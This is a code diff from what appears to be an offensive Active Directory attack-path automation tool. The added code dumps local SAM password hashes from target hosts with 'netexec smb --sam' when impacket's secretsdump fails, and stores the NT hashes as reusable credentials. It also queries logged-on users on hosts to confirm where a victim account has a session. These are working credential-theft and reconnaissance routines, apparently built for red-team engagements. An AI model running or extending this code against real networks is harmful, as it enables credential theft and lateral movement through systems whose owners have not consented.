@@ -15,6 +15,11 @@ from pathstrike.models import (
     RollbackAction,
 )
 from pathstrike.tools import impacket_wrapper as impacket
+from pathstrike.tools.netexec_wrapper import (
+    _parse_secretsdump_hashes,
+    loggedon_users,
+    run_netexec,
+)
 
 
 @register_handler("AdminTo")
@@ -89,10 +94,43 @@ class AdminToHandler(BaseEdgeHandler):
         )
 
         if not result["success"]:
+            # Fallback: netexec local SAM dump (different exec/dump primitive;
+            # works when secretsdump's DRSUAPI/remote-registry path is blocked).
+            self.logger.info(
+                "secretsdump failed on %s; falling back to netexec smb --sam",
+                target_host,
+            )
+            nxc_result = await run_netexec(
+                "smb",
+                target_host,
+                ["--sam"],
+                self._get_nxc_auth_args(principal),
+                timeout=120,
+            )
+            nxc_hashes = _parse_secretsdump_hashes(nxc_result.get("output", ""))
+            if not nxc_hashes:
+                return (
+                    False,
+                    f"secretsdump failed on {target_host}: "
+                    f"{result.get('error', 'unknown')} "
+                    f"(netexec --sam fallback: {nxc_result.get('error', 'no hashes')})",
+                    [],
+                )
+            new_creds = [
+                Credential(
+                    cred_type=CredentialType.nt_hash,
+                    value=nt,
+                    username=user,
+                    domain=target,  # SAM hashes are local accounts
+                    obtained_from=f"netexec --sam on {target_host} (AdminTo)",
+                )
+                for user, nt in nxc_hashes.items()
+            ]
             return (
-                False,
-                f"secretsdump failed on {target_host}: {result.get('error', 'unknown')}",
-                [],
+                True,
+                f"netexec --sam on {target_host}: extracted {len(nxc_hashes)} "
+                "local hashes (secretsdump fallback)",
+                new_creds,
             )
 
         hashes: dict[str, str] = result.get("hashes", {})
@@ -150,15 +188,44 @@ class HasSessionHandler(BaseEdgeHandler):
     ) -> tuple[bool, str, list[Credential]]:
         source = self._resolve_principal(edge)
         target = self._resolve_target(edge)
+        source_host = edge.source.properties.get("ip_address") or (
+            edge.source.name.split("@")[0]
+        )
 
         self.logger.info(
             "HasSession pass-through: %s has session on %s", target, source
         )
 
+        if dry_run:
+            return (
+                True,
+                f"[DRY RUN] Would confirm {target}'s session on {source} via "
+                "netexec --loggedon-users.",
+                [],
+            )
+
+        # Best-effort live confirmation: --loggedon-users needs local admin on
+        # the source host, so this enriches the result when we have it but never
+        # downgrades the (informational) edge to a failure when we don't.
+        live_note = ""
+        try:
+            nxc_result = await loggedon_users(source_host, self._get_nxc_auth_args())
+            if nxc_result.get("success"):
+                listed = (nxc_result.get("parsed") or {}).get("command_output", "")
+                if target.lower() in listed.lower():
+                    live_note = f" Confirmed live: {target} is logged on to {source}."
+                else:
+                    live_note = (
+                        f" Queried logged-on users on {source} "
+                        "(session not currently visible)."
+                    )
+        except Exception as exc:  # pragma: no cover - best-effort enrichment
+            self.logger.debug("loggedon-users enrichment failed: %s", exc)
+
         return (
             True,
             f"HasSession noted: {target} has session on {source}. "
-            f"Credential extraction depends on admin access to {source}.",
+            f"Credential extraction depends on admin access to {source}.{live_note}",
             [],
         )
 
